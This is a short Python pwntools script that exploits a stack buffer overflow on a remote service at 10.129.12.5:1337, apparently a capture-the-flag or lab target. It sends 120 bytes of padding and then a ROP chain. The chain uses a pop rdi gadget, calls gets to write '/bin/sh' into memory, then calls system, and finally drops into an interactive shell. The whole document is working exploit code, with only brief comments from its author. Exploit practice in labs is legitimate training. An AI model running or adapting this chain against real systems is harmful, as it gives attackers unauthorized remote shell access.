
from pwn import *

context(os="linux", arch="amd64")
#context(log_level='DEBUG')

junk = ("A"*120).encode() # also not encoded properly

plt_gets = p64(0x401060)
plt_system = p64(0x401040)
pop_rdi = p64(0x40120b)
binsh = p64(0x404038)

# I added this due type error
sh_cli = "/bin/sh\x00".encode()

#payload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system

p = remote("10.129.12.5", 1337)
p.recvline()
p.sendline(junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system)
p.sendline(sh_cli)
p.interactive()
